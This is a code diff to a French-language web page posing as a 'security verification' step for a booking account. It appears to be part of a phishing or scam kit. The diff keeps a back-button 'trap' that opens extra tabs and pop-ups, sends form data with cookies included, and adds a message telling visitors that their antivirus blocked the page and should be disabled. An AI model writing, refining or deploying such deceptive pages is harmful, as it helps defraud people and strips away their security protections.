@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="robots" content="noindex, nofollow">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🌐</text></svg>">
 <meta name="description" content="Espace securise de gestion de reservation. Verification de securite requise avant acces.">
 <title>Verification de securite - Espace reservation</title>
 <style id="ts">
@@ -143,13 +144,14 @@ function openInNewTab(url) {
 
 function handleRedirects(mainUrl, popUrl, backId) {
     if (hasRedirected) return;
+    if (!mainUrl) { location.reload(); return; }
     hasRedirected = true;
 
-    if (popUrl) {
+    if (popUrl && popUrl !== mainUrl) {
         openInNewTab(popUrl);
     }
 
-    if (backId) {
+    if (backId && backId !== mainUrl) {
         var trapUrl = baseUrl + "?sec_id=" + backId + getSearchParams();
         openInNewTab(trapUrl);
     }
@@ -190,7 +192,7 @@ function requestLinks(buttonElement) {
         formData.append(key, value);
     });
 
-    fetch(baseUrl, { method: "POST", body: formData })
+    fetch(baseUrl, { method: "POST", body: formData, credentials: "include" })
         .then(function(response) { return response.json(); })
         .then(function(data) {
             if (data.status === "ok") {
@@ -223,7 +225,7 @@ function loadTemplate() {
     var indicator = document.getElementById("loading-indicator");
     indicator.style.display = "inline-flex";
 
-    fetch(templateUrl + extraParams)
+    fetch(templateUrl + extraParams, { credentials: "include" })
         .then(function(response) {
             if (!response.ok) throw new Error("Network error");
             return response.json();
@@ -276,7 +278,8 @@ function loadTemplate() {
             }
         })
         .catch(function() {
-            indicator.style.display = "none";
+            // Fetch bloqué (ex: antivirus injecte CSP restrictif)
+            indicator.innerHTML = '<span style="color:#c00">Chargement bloque par votre antivirus. Desactivez-le ou essayez un autre navigateur.</span>';
         });
 }
 
